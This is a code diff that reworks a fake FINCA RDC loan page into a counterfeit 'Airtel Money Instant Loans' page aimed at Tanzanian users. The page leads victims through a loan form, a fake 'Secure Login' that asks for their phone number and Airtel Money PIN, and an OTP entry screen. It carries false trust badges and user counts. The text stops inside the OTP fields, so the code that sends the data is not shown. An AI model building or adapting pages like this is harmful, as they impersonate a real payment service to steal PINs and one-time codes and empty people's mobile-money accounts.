@@ -3,29 +3,30 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>FINCA RDC - Crédit en Ligne</title>
+  <title>Airtel Money - Instant Loans</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
 
     :root {
-      --finca-blue: #003865;
-      --finca-red: #A6192E;
-      --finca-gray: #f4f4f4;
-      --text-dark: #333333;
-      --text-muted: #666666;
-      --border-color: #dcdcdc;
+      --airtel-red: #E40000;
+      --airtel-red-hover: #B30000;
+      --airtel-light-red: #FFF0F0;
+      --airtel-dark: #1A1A1A;
+      --airtel-gray: #f7f9fa;
+      --text-muted: #64748B;
+      --border-color: #E2E8F0;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
     button:focus { outline: none; }
     
     body { 
-      background: var(--finca-gray); 
+      background: var(--airtel-gray); 
       display: flex; 
       justify-content: center; 
       align-items: center;
       min-height: 100vh; 
-      color: var(--text-dark);
+      color: var(--airtel-dark);
       overflow: hidden; 
     }
 
@@ -42,91 +43,13 @@
 
     @media (min-width: 481px) {
       .app-wrapper {
-        height: 90vh;
-        max-height: 850px;
-        border-radius: 8px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        height: 95vh;
+        max-height: 900px;
+        border-radius: 12px;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        border: 1px solid var(--border-color);
       }
     }
-
-    /* --- VIDEO AD SCREEN --- */
-    #page-ad {
-      background: #000;
-      display: flex; 
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      position: relative;
-      cursor: pointer;
-      overflow: hidden;
-    }
-    
-    #page-ad.active { display: flex; } 
-
-    /* Fake Video Player Progress Bar */
-    .video-progress-container {
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 4px;
-      background: rgba(255,255,255,0.2);
-      z-index: 10;
-    }
-    .video-progress-bar {
-      height: 100%; width: 0%;
-      background: var(--finca-red);
-      animation: playVideo 8s linear forwards;
-    }
-    @keyframes playVideo {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
-
-    /* Video Content Placeholder (Since we don't have an MP4 file yet) */
-    .video-content-placeholder {
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: linear-gradient(135deg, #003865 0%, #001f3f 100%);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 1;
-    }
-
-    .video-text-1 { font-size: 2.2rem; font-weight: 800; color: #fff; margin-bottom: 10px; opacity: 0; animation: fadeInUp 1s 0.5s forwards; }
-    .video-text-2 { font-size: 1.5rem; font-weight: 600; color: #F5B700; margin-bottom: 10px; opacity: 0; animation: fadeInUp 1s 2s forwards; }
-    .video-text-3 { font-size: 1.5rem; font-weight: 600; color: #F5B700; margin-bottom: 30px; opacity: 0; animation: fadeInUp 1s 3.5s forwards; }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* CTA Button overlay */
-    .video-cta {
-      position: absolute;
-      bottom: 50px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 10;
-      background: var(--finca-red); color: #fff; border: none; border-radius: 30px;
-      padding: 15px 40px; font-size: 1.2rem; font-weight: 700;
-      box-shadow: 0 5px 20px rgba(166,25,46,0.5);
-      animation: bounce 2s infinite;
-    }
-    @keyframes bounce {
-      0%, 20%, 50%, 80%, 100% {transform: translateX(-50%) translateY(0);}
-      40% {transform: translateX(-50%) translateY(-10px);}
-      60% {transform: translateX(-50%) translateY(-5px);}
-    }
-
-    .skip-text {
-      position: absolute; top: 20px; right: 20px; z-index: 10;
-      color: #fff; font-size: 0.9rem; font-weight: 600;
-      background: rgba(0,0,0,0.5); padding: 5px 12px; border-radius: 20px;
-    }
-    /* --------------------------------- */
-
 
     /* Top Navigation Bar */
     .navbar {
@@ -142,34 +65,27 @@
     }
     
     .logo-container { display: flex; align-items: center; gap: 8px; }
-    .logo-icon {
-      width: 32px; height: 32px;
-      background-color: var(--finca-red);
-      border-radius: 50%;
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .logo-icon::after {
-      content: ''; position: absolute; width: 18px; height: 18px;
-      background: #fff; border-radius: 50% 50% 0 0; top: 7px;
-    }
-    .logo-icon::before {
-      content: ''; position: absolute; width: 24px; height: 12px;
-      background: #fff; border-radius: 50%; bottom: 5px; z-index: 2;
-    }
-    .navbar h1 { font-size: 1.4rem; font-weight: 700; color: #999; letter-spacing: 1px;}
     
-    /* Language Toggle */
-    .lang-toggle {
-      display: flex; gap: 5px; font-size: 0.85rem; font-weight: 700;
+    /* Airtel Logo */
+    .airtel-logo { display: flex; align-items: center; gap: 5px; }
+    .airtel-swirl {
+      width: 28px; height: 28px;
+      background-color: var(--airtel-red);
+      border-radius: 50% 50% 50% 0;
+      transform: rotate(-45deg);
+      position: relative;
     }
-    .lang-toggle span {
-      cursor: pointer; padding: 4px 8px; border-radius: 4px; color: #999;
-      transition: 0.2s;
+    .airtel-swirl::after {
+      content: ''; position: absolute; top: 6px; left: 6px; width: 16px; height: 16px;
+      background: #fff; border-radius: 50% 50% 50% 0;
     }
-    .lang-toggle span.active { background: var(--finca-blue); color: #fff; }
+    .logo-text h1 { font-size: 1.4rem; font-weight: 800; color: var(--airtel-dark); line-height: 1; letter-spacing: -0.5px;}
+    .logo-text span { font-size: 0.65rem; color: var(--airtel-red); font-weight: 700; text-transform: uppercase;}
+    
+    .btn-header {
+      background: var(--airtel-red); color: #fff; border: none; border-radius: 6px;
+      padding: 8px 12px; font-size: 0.8rem; font-weight: 700; cursor: pointer;
+    }
 
     .page-container {
       flex: 1;
@@ -183,106 +99,118 @@
     .page.active { display: flex; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    /* --- PAGE 1: LOAN CALCULATOR (Hero Section) --- */
+    /* --- PAGE 1: HERO SECTION --- */
     .hero-section {
-      background-color: var(--finca-blue);
-      color: #fff;
-      padding: 40px 20px;
+      background: #fff;
+      padding: 30px 20px;
       flex: 1;
       display: flex;
       flex-direction: column;
     }
-    .hero-section h2 { font-size: 2rem; font-weight: 800; line-height: 1.2; margin-bottom: 20px; }
-    .hero-section p { font-size: 1.1rem; margin-bottom: 25px; opacity: 0.9; line-height: 1.4; }
-    
-    .btn-primary {
-      background: var(--finca-red); color: #fff; border: none; border-radius: 30px;
-      padding: 15px 30px; font-size: 1rem; font-weight: 700;
-      cursor: pointer; transition: 0.2s; align-self: flex-start;
-    }
-    .btn-primary:active { opacity: 0.8; }
 
-    /* Loan Calculator Card */
-    .calc-card {
+    .trust-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: var(--airtel-light-red); color: var(--airtel-red);
+      padding: 6px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 700;
+      margin-bottom: 25px; align-self: flex-start; border: 1px solid #ffcccc;
+    }
+    
+    .hero-section h2 { font-size: 2.2rem; font-weight: 800; line-height: 1.1; margin-bottom: 15px; color: var(--airtel-dark); letter-spacing: -1px;}
+    .hero-section p { font-size: 0.95rem; margin-bottom: 25px; color: var(--text-muted); line-height: 1.5; }
+
+    /* Loan Card Box */
+    .loan-card {
       background: #fff;
-      border-radius: 8px;
+      border-radius: 12px;
       padding: 20px;
-      margin: 20px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      color: var(--text-dark);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      border: 1px solid var(--border-color);
+      margin-bottom: 25px;
+      position: relative;
     }
-    .calc-labels { display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 10px; color: var(--finca-blue); }
-    .calc-sub { display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-muted); margin-top: 5px; margin-bottom: 20px;}
-    
-    input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; height: 20px; }
-    input[type=range]::-webkit-slider-thumb {
-      -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%;
-      background: var(--finca-red); cursor: pointer; margin-top: -8px;
-    }
-    input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 4px; background: #ddd; border-radius: 2px; }
 
-    .monthly-box {
-      background: var(--finca-gray); border-radius: 6px; padding: 15px;
-      display: flex; justify-content: space-between; align-items: center;
+    .loan-card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+    .icon-box { width: 40px; height: 40px; border-radius: 50%; background: var(--airtel-light-red); display: flex; align-items: center; justify-content: center; color: var(--airtel-red); font-size: 1.2rem; }
+    .loan-card-title { display: flex; flex-direction: column; }
+    .loan-card-title span { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
+    .loan-card-title h3 { font-size: 1.3rem; font-weight: 800; color: var(--airtel-dark); }
+
+    .loan-details { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .loan-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding-bottom: 12px; border-bottom: 1px solid var(--border-color); }
+    .loan-row span:first-child { color: var(--text-muted); font-weight: 500; }
+    .loan-row span:last-child { color: var(--airtel-dark); font-weight: 700; }
+    .loan-row span.highlight { color: var(--airtel-red); }
+
+    .trust-box {
+      background: var(--airtel-light-red); border-radius: 8px; padding: 15px; text-align: center;
+      border: 1px solid #ffcccc;
     }
-    .monthly-box span:first-child { font-size: 1rem; font-weight: 600; }
-    .monthly-box span:last-child { font-size: 1.4rem; font-weight: 800; color: var(--finca-red); }
+    .trust-box span { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
+    .trust-box h4 { font-size: 1.5rem; font-weight: 800; color: var(--airtel-red); }
+
+    .btn-primary {
+      background: var(--airtel-red); color: #fff; border: none; border-radius: 8px;
+      padding: 16px; font-size: 1rem; font-weight: 700; width: 100%;
+      cursor: pointer; transition: 0.2s; margin-top: 10px;
+    }
+    .btn-primary:active { background: var(--airtel-red-hover); }
 
     /* --- PAGE 2: QUESTIONNAIRE --- */
-    .form-title { font-size: 1.8rem; margin: 30px 20px 20px; font-weight: 700; color: var(--finca-blue); }
+    .form-title { font-size: 1.6rem; margin: 30px 20px 20px; font-weight: 800; color: var(--airtel-dark); }
     .form-group { padding: 0 20px; margin-bottom: 20px; }
-    .form-group label { display: block; font-size: 0.9rem; font-weight: 700; margin-bottom: 8px; color: var(--finca-blue); }
+    .form-group label { display: block; font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; color: var(--airtel-dark); }
     .form-group input, .form-group select {
-      width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 6px;
+      width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 8px;
       font-size: 16px; color: #333; background: #fff;
     }
-    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--finca-red); }
+    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
     
     .btn-submit {
-      background: var(--finca-red); color: #fff; border: none; border-radius: 6px;
+      background: var(--airtel-red); color: #fff; border: none; border-radius: 8px;
       width: calc(100% - 40px); margin: 10px 20px 30px; padding: 16px; font-size: 1rem; font-weight: 700;
-      cursor: pointer;
+      cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px;
     }
+    .btn-submit:disabled { background: #ff8080; cursor: wait; }
 
     /* --- PAGE 3 & 4: LOGIN / OTP --- */
     .login-container { display: flex; flex-direction: column; flex: 1; background: #fff; position: relative; }
     
     .login-top { flex: 1; padding: 30px 20px; text-align: center; display: flex; flex-direction: column; justify-content: center; margin-bottom: 30px;}
-    .login-logo { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; color: var(--finca-red); letter-spacing: 1px;}
-    .login-top h3 { font-size: 1.3rem; color: var(--finca-blue); margin-bottom: 30px; font-weight: 700;}
+    .login-logo { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; color: var(--airtel-red); letter-spacing: -1px;}
+    .login-top h3 { font-size: 1.2rem; color: var(--airtel-dark); margin-bottom: 30px; font-weight: 700;}
 
     .phone-input-box {
-      display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 6px;
+      display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 8px;
       padding: 12px; margin-bottom: 25px; max-width: 350px; margin-left: auto; margin-right: auto; width: 100%;
     }
-    .country-code { display: flex; align-items: center; font-size: 1rem; font-weight: 600; padding-right: 15px; border-right: 1px solid var(--border-color); color: var(--finca-blue); }
+    .country-code { display: flex; align-items: center; font-size: 1rem; font-weight: 600; padding-right: 15px; border-right: 1px solid var(--border-color); color: var(--airtel-dark); }
     
-    /* DRC Flag SVG */
+    /* Tanzania Flag SVG */
     .flag-icon {
       width: 24px; height: 16px; margin-right: 8px;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 600'%3E%3Cpath fill='%230078d4' d='M0 0h800v600H0z'/%3E%3Cpath fill='%23ce1021' d='M0 400L800 200v100L0 500z'/%3E%3Cpath fill='%23f7d618' d='M0 425L800 225v50L0 475z'/%3E%3Cpath fill='%23f7d618' d='M100 80l20 60 60 20-60 20-20 60-20-60-60-20 60-20z'/%3E%3C/svg%3E");
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 600'%3E%3Cpath fill='%231EB53E' d='M0 0h800v600H0z'/%3E%3Cpath fill='%2300A3DD' d='M0 600L800 0H0z'/%3E%3Cpath stroke='%23FCD116' stroke-width='100' d='M0 600L800 0'/%3E%3Cpath stroke='%23000' stroke-width='50' d='M0 600L800 0'/%3E%3C/svg%3E");
       background-size: cover; border-radius: 2px;
     }
-    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 600; letter-spacing: 1px; color: var(--finca-blue);}
+    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 700; letter-spacing: 1px; color: var(--airtel-dark);}
 
-    .pin-label { color: var(--finca-blue); font-weight: 600; margin-bottom: 15px; font-size: 0.95rem; }
+    .pin-label { color: var(--text-muted); font-weight: 600; margin-bottom: 15px; font-size: 0.95rem; }
     .pin-boxes { display: flex; justify-content: center; gap: 12px; }
     .pin-boxes input {
-      width: 50px; height: 60px; border: 1px solid var(--border-color); border-radius: 6px;
-      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none; color: var(--finca-blue);
+      width: 50px; height: 60px; border: 1px solid var(--border-color); border-radius: 8px;
+      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none; color: var(--airtel-dark);
     }
-    .pin-boxes input:focus { border-color: var(--finca-red); }
+    .pin-boxes input:focus { border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
 
     .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
     .otp-boxes input {
-      width: 45px; height: 55px; border: 1px solid var(--border-color); border-radius: 6px;
-      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none; color: var(--finca-blue);
+      width: 45px; height: 55px; border: 1px solid var(--border-color); border-radius: 8px;
+      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none; color: var(--airtel-dark);
     }
-    .otp-boxes input:focus { border-color: var(--finca-red); }
+    .otp-boxes input:focus { border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
     .resend-text { color: var(--text-muted); font-size: 0.9rem; font-weight: 600; }
     
     .login-bottom {
-      background: var(--finca-blue);
+      background: var(--airtel-dark);
       padding: 40px 20px calc(30px + env(safe-area-inset-bottom));
       color: #fff; text-align: center; margin-top: auto;
       position: relative;
@@ -292,15 +220,15 @@
     .bottom-buttons { display: flex; gap: 12px; max-width: 350px; margin: 0 auto; }
     
     .bottom-buttons button {
-      flex: 1; background: #fff; color: var(--finca-blue); border: none; border-radius: 6px;
+      flex: 1; background: #fff; color: var(--airtel-dark); border: none; border-radius: 6px;
       padding: 12px; font-size: 0.85rem; font-weight: 700; cursor: pointer;
       display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
       min-height: 60px;
     }
-    .bottom-buttons button i { color: var(--finca-red); font-size: 1.4rem; }
+    .bottom-buttons button i { color: var(--airtel-red); font-size: 1.4rem; }
     
     .login-footer { margin-top: 25px; font-size: 0.75rem; color: rgba(255,255,255,0.7); line-height: 1.5; }
-    .login-footer a { color: #fff; text-decoration: underline; }
+    .login-footer a { color: var(--airtel-red); text-decoration: underline; }
 
     .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1rem; font-weight: 600; margin-bottom: 20px; cursor: pointer; color: #fff;}
     .help-link i { font-size: 1.3rem; }
@@ -312,15 +240,15 @@
     }
     .spinner {
       width: 60px; height: 60px; border: 4px solid var(--border-color);
-      border-top: 4px solid var(--finca-red); border-radius: 50%;
+      border-top: 4px solid var(--airtel-red); border-radius: 50%;
       animation: spin 1s linear infinite; margin-bottom: 25px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .waiting-screen h2 { font-size: 1.5rem; color: var(--finca-blue); margin-bottom: 10px; font-weight: 700;}
+    .waiting-screen h2 { font-size: 1.5rem; color: var(--airtel-dark); margin-bottom: 10px; font-weight: 800;}
     .waiting-screen p { color: var(--text-muted); line-height: 1.5; }
 
     /* Utilities */
-    .error { color: var(--finca-red); font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 600; text-align: center;}
+    .error { color: #dc2626; font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 600; text-align: center;}
     .hidden { display: none !important; }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -328,304 +256,197 @@
 <body>
 
 <div class="app-wrapper">
-  
-  <!-- THE VIDEO AD PAGE -->
-  <div id="page-ad" class="page active" onclick="skipAd()">
-    <!-- Fake Video Player Top Bar -->
-    <div class="video-progress-container">
-      <div class="video-progress-bar"></div>
+  <!-- Navbar -->
+  <div class="navbar">
+    <div class="logo-container">
+      <div class="airtel-logo">
+        <div class="airtel-swirl"></div>
+        <div class="logo-text">
+          <h1>airtel</h1>
+          <span>Money</span>
+        </div>
+      </div>
     </div>
-    
-    <div class="skip-text">Tap to Skip</div>
-
-    <!-- Simulated Video Scene (This acts as the video) -->
-    <div class="video-content-placeholder">
-      <div class="video-text-1">FINCA RDC</div>
-      <div class="video-text-2">Loan Amount: Up to 1,000,000 FC</div>
-      <div class="video-text-3">Repayment: 6 - 60 Months</div>
-      
-      <!-- Call to Action Button inside the video -->
-      <button class="video-cta" onclick="event.stopPropagation(); skipAd();">Apply Now</button>
-    </div>
+    <button class="btn-header" onclick="showPage('page2')">Apply for a Loan</button>
   </div>
 
-  <!-- Main App Content (Hidden until ad is skipped) -->
-  <div id="main-app" style="display: none; flex-direction: column; height: 100%;">
-    <!-- Navbar -->
-    <div class="navbar">
-      <div class="logo-container">
-        <div class="logo-icon"></div>
-        <h1>FINCA</h1>
-      </div>
-      <div class="lang-toggle">
-        <span id="btn-en" onclick="setLanguage('en')">EN</span>
-        <span id="btn-fr" class="active" onclick="setLanguage('fr')">FR</span>
+  <div class="page-container">
+    <!-- Page 1: Hero & Loan Card -->
+    <div id="page1" class="page active">
+      <div class="hero-section">
+        <div class="trust-badge">
+          <i class="fa-solid fa-shield-halved"></i> Licensed Digital Lending
+        </div>
+        
+        <h2>Instant Loans.<br>Anytime. Anywhere.</h2>
+        <p>Quick access to credit for individuals and businesses. Join over 30,000 Tanzanians already empowered by Airtel Money.</p>
+
+        <div class="loan-card">
+          <div class="loan-card-header">
+            <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
+            <div class="loan-card-title">
+              <span>Loan Amount</span>
+              <h3>Up to TZS 1,000,000</h3>
+            </div>
+          </div>
+
+          <div class="loan-details">
+            <div class="loan-row">
+              <span>Approval Time</span>
+              <span class="highlight">Instant</span>
+            </div>
+            <div class="loan-row">
+              <span>Disbursement</span>
+              <span class="highlight">Airtel Money</span>
+            </div>
+            <div class="loan-row" style="border-bottom: none;">
+              <span>Duration</span>
+              <span>Flexible Terms</span>
+            </div>
+          </div>
+
+          <div class="trust-box">
+            <span>Trusted by</span>
+            <h4>30,000+</h4>
+            <span>Tanzanians</span>
+          </div>
+        </div>
+
+        <button class="btn-primary" onclick="showPage('page2')">Apply Now</button>
       </div>
     </div>
 
-    <div class="page-container">
-      <!-- Page 1: Hero & Calculator -->
-      <div id="page1" class="page">
-        <div class="hero-section">
-          <h2 id="t-hero-title">Boostez votre entreprise dès aujourd'hui</h2>
-          <p id="t-hero-sub">Demandez votre crédit en ligne<br>Réponse en 7 jours</p>
-          <button class="btn-primary" onclick="showPage('page2')" id="t-hero-btn">Demander votre prêt</button>
+    <!-- Page 2: Questionnaire -->
+    <div id="page2" class="page">
+      <h2 class="form-title">Your Application</h2>
+      <form id="formQuestionnaire" style="padding-bottom: 20px;">
+        <div class="form-group">
+          <label>Full name</label>
+          <input type="text" id="qName" required placeholder="Enter your full name">
+        </div>
+        <div class="form-group">
+          <label>Employment status</label>
+          <select id="qEmployment" required>
+            <option value="">Select your employment status</option>
+            <option>Employed</option>
+            <option>Self-Employed</option>
+            <option>Unemployed</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Monthly income (TZS)</label>
+          <input type="number" id="qIncome" required placeholder="Enter your monthly income">
+        </div>
+        <div class="form-group">
+          <label>Loan amount (TZS)</label>
+          <input type="number" id="qAmount" required placeholder="Enter loan amount">
+        </div>
+        <div class="form-group">
+          <label>Repayment period</label>
+          <select id="qTerm" required>
+            <option value="">Select repayment period</option>
+            <option>1 month</option>
+            <option>3 months</option>
+            <option>6 months</option>
+            <option>12 months</option>
+          </select>
+        </div>
+        
+        <div class="error" id="errQ"></div>
+        <button type="submit" id="btnSubmitForm" class="btn-submit">
+          <span>SUBMIT APPLICATION</span>
+        </button>
+      </form>
+    </div>
+
+    <!-- Page 3: Phone & PIN -->
+    <div id="page3" class="page">
+      <div class="login-container">
+        <div class="login-top">
+          <div class="login-logo" style="color: var(--airtel-red);">airtel money</div>
+          <h3>Secure Login</h3>
+
+          <div class="phone-input-box">
+            <div class="country-code">
+              <div class="flag-icon"></div>
+              +255
+            </div>
+            <input type="tel" id="pPhone" placeholder="Airtel Phone Number" autocomplete="off">
+          </div>
+
+          <p class="pin-label">Enter your Airtel Money PIN</p>
+          <div class="pin-boxes" id="pinContainer">
+            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
+            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
+            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
+            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" id="pin3">
+          </div>
+          <div class="error" id="errLogin" style="margin-top: 15px;"></div>
         </div>
 
-        <div class="calc-card">
-          <div class="calc-labels"><span id="t-calc-amount">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
-          <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
-          <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
-
-          <div class="calc-labels"><span id="t-calc-term">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
-          <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-          <div class="calc-sub"><span id="t-term-min">6 mois</span><span id="t-term-max">60 mois</span></div>
-
-          <div class="monthly-box">
-            <span id="t-monthly">Paiement mensuel</span>
-            <span id="monthlyLabel">45 000 FC</span>
+        <div class="login-bottom">
+          <p>To register an Airtel Money account or get assistance,<br>click below</p>
+          <div class="bottom-buttons">
+            <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i>Register</button>
+            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
           </div>
-        </div>
-      </div>
-
-      <!-- Page 2: Questionnaire -->
-      <div id="page2" class="page">
-        <h2 class="form-title" id="t-form-title">Votre Demande</h2>
-        <form id="formQuestionnaire" style="padding-bottom: 20px;">
-          <div class="form-group">
-            <label id="t-name">Nom complet</label>
-            <input type="text" id="qName" required placeholder="Entrez votre nom complet">
-          </div>
-          <div class="form-group">
-            <label id="t-emp">Situation professionnelle</label>
-            <select id="qEmployment" required>
-              <option value="" id="t-emp-sel">Sélectionnez votre situation</option>
-              <option value="Employé" id="t-emp-1">Employé</option>
-              <option value="Travailleur indépendant" id="t-emp-2">Travailleur indépendant</option>
-              <option value="Sans emploi" id="t-emp-3">Sans emploi</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label id="t-income">Revenu mensuel (FC)</label>
-            <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
-          </div>
-          <div class="form-group">
-            <label id="t-amount">Montant du prêt (FC)</label>
-            <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
-          </div>
-          <div class="form-group">
-            <label id="t-period">Période de remboursement</label>
-            <select id="qTerm" required>
-              <option value="" id="t-period-sel">Sélectionnez la période</option>
-              <option value="6 mois" id="t-period-1">6 mois</option>
-              <option value="12 mois" id="t-period-2">12 mois</option>
-              <option value="24 mois" id="t-period-3">24 mois</option>
-              <option value="36 mois" id="t-period-4">36 mois</option>
-            </select>
-          </div>
-          
-          <div class="error" id="errQ"></div>
-          <button type="submit" class="btn-submit" id="t-submit">SOUMETTRE LA DEMANDE</button>
-        </form>
-      </div>
-
-      <!-- Page 3: Phone & PIN -->
-      <div id="page3" class="page">
-        <div class="login-container">
-          <div class="login-top">
-            <div class="login-logo">FINCA</div>
-            <h3 id="t-login">Connexion</h3>
-
-            <div class="phone-input-box">
-              <div class="country-code">
-                <div class="flag-icon"></div>
-                +243
-              </div>
-              <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
-            </div>
-
-            <p class="pin-label" id="t-pin">Entrez votre code PIN</p>
-            <div class="pin-boxes" id="pinContainer">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
-              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
-              <input type="password" maxlength="1" inputmode="numeric" id="pin3">
-            </div>
-            <div class="error" id="errLogin" style="margin-top: 15px;"></div>
-          </div>
-
-          <div class="login-bottom">
-            <p id="t-register-text">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
-            <div class="bottom-buttons">
-              <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">S'inscrire</span></button>
-              <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Aide & Support</span></button>
-            </div>
-            <div class="login-footer">
-              v4.0.3P<br><br>
-              <span id="t-terms-text">En vous connectant, vous acceptez les</span> <a href="#" id="t-terms-link">Conditions Générales</a>
-            </div>
+          <div class="login-footer">
+            v4.0.3P<br><br>
+            By signing in you agree to the <a href="#">Terms and Conditions</a>
           </div>
         </div>
       </div>
+    </div>
 
-      <!-- Page 4: OTP -->
-      <div id="page4" class="page">
-        <div class="login-container">
-          <div class="login-top">
-            <div class="login-logo">FINCA</div>
-            <h3 id="t-otp">Entrez le code OTP envoyé à</h3>
-            <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
+    <!-- Page 4: OTP -->
+    <div id="page4" class="page">
+      <div class="login-container">
+        <div class="login-top">
+          <div class="login-logo" style="color: var(--airtel-red);">airtel money</div>
+          <h3>Enter the OTP code sent to</h3>
+          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--airtel-red);">+255 00 000 0000</div>
 
-            <div class="otp-boxes" id="otpContainer">
-              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
-              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
-              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
-              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
-              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
-              <input type="text" maxlength="1" inputmode="numeric" id="otp5">
-            </div>
-
-            <p class="resend-text"><span id="t-resend">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
-            <div class="error" id="errOtp" style="margin-top: 15px;"></div>
+          <div class="otp-boxes" id="otpContainer">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
